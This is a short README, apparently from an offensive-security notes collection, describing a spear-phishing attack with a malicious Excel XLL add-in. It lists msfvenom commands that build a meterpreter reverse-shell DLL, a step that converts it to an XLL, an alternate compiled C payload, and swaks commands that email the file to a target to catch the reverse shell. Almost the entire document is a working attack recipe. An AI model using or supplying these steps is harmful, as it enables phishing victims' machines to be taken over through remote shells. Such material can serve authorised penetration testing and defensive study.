# Spear Phish with XLL file

## STEPS:

 - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=MY_PORT -f dll > pwn.dll (Create a .dll file)

## Then convert that .dll file to .xll with a python script (Will provide the script in this folder)

 - python3 dll2xll.py (DON'T FORGET TO EDIT THE SCRIPT WITHIN TO INSERT YOUR FILE YOU WANT TO TARGET)

 - swaks --to TARGET@DOMAIN.LOCAL --from MYSELF@TESTMAIL.COM --header "Subject: WHATEVER" --body "WHATEVER" --attach @pwn.xll --server TARGET_IP --port 25 (Send the malicious file to our target to catch the reverse shell)

 
## ALTERNATE METHOD WITHOUT METASPLOIT

### Take the xllexploit.c script within this folder and edit the script accordingly

 - x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll xllexploit.c -luser32 (Compile the xllexploit.c file to an .xll file. Make sure you set the right command within the .c file!)

 - swaks --to TARGET@DOMAIN.LOCAL --from MYSELF@TESTMAIL.COM --header "Subject: WHATEVER" --body "WHATEVER" --attach @shell.xll --server TARGET_IP --port 25 (Send the malicious file to our target to catch the reverse shell)
